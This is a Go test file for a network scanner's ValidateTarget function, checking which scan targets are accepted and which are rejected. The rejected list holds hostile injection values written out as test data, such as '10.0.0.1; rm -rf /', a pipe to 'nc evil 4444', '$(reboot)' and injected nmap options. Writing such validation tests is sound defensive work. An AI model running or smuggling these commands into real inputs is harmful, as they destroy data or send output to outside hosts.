package netscan

import "testing"

func TestValidateTargetAccepts(t *testing.T) {
	valid := []string{
		"10.0.0.0/24",
		"192.168.1.0/24",
		"10.0.0.0/8", // exactly at the IPv4 breadth limit
		"10.0.0.1-50",
		"192.168.1-10.0-255",
		"192.168.1.1",
		"2001:db8::1",
		"2001:db8::/32",
		"host.example.com",
		"scanner-01.internal",
		"a",
	}
	for _, tc := range valid {
		if err := ValidateTarget(tc); err != nil {
			t.Errorf("ValidateTarget(%q) = %v, want nil", tc, err)
		}
	}
}

func TestValidateTargetRejects(t *testing.T) {
	invalid := []string{
		"",
		"--script=http-vuln",
		"-oN /tmp/x",
		"-sV",
		"10.0.0.1; rm -rf /",
		"10.0.0.1 | nc evil 4444",
		"$(reboot)",
		"`id`",
		"10.0.0.1 --script=x",
		"host&whoami",
		"a<b",
		"a>b",
		"a'b",
		"a\"b",
		"10.0.0.1\n-sV",
		"-",
		// Over-broad CIDRs the root sensor must never scan (GHSA-c5gj).
		"0.0.0.0/0",
		"10.0.0.0/7",
		"128.0.0.0/1",
		"::/0",
		"2001:db8::/31",
	}
	for _, tc := range invalid {
		if err := ValidateTarget(tc); err == nil {
			t.Errorf("ValidateTarget(%q) = nil, want error", tc)
		}
	}
}
